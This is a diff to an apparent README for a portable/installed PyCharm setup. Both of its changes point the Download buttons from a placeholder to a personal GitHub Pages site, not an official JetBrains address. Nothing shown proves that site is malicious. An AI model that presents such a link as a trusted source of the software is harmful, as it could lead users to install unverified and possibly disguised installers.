@@ -17,7 +17,7 @@ A single JetBrains PyCharm desktop deployment covers both portable and installed
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://carla-butler-46.github.io/jetbrains-pycharm-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Coexistence with another installation of the same tooling is supported by design
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://carla-butler-46.github.io/jetbrains-pycharm-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
